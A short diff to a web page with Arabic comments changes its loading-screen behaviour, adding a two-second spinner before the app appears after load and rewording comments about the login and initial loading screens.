@@ -51,7 +51,7 @@
     40%{transform:scale(1);}
   }
 
-  /* شاشة التحميل عند الضغط على تسجيل الدخول (دائرة دوارة) */
+  /* شاشة التحميل عند الضغط على تسجيل الدخول أو العودة */
   .loading-screen{
     position:fixed;
     inset:0;
@@ -76,7 +76,7 @@
 
 <div class="sysbar"></div>
 
-<!-- التحميل الأولي -->
+<!-- التحميل الأولي عند فتح الموقع -->
 <div class="initial-loading" id="initial-loading">
   <div class="dot"></div>
   <div class="dot"></div>
@@ -121,7 +121,7 @@
   </div>
 </div>
 
-<!-- شاشة التحميل عند الضغط على تسجيل الدخول -->
+<!-- شاشة التحميل عند الضغط على تسجيل الدخول أو العودة -->
 <div class="loading-screen" id="loading-screen">
   <div class="spinner"></div>
 </div>
@@ -139,12 +139,17 @@ const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6n
 let platform = null;
 const repReg = /^(\d)\1{6,}$/;
 
-// عرض الواجهة بعد التحميل الأولي
+// إخفاء التحميل الأولي بعد مدة قصيرة
 window.addEventListener('load', ()=>{
   setTimeout(()=>{
     initialLoading.style.display = 'none';
-    app.style.display = 'block';
-  }, 1000); // يمكنك تعديل 1000ms للمدة التي تريدها
+    // عند الرجوع للصفحة: إظهار الدائرة الدوارة لمدة ثانيتين
+    loadingScreen.style.display = "flex";
+    setTimeout(()=>{
+      loadingScreen.style.display = "none";
+      app.style.display = 'block';
+    }, 2000);
+  }, 1000);
 });
 
 function validate() {
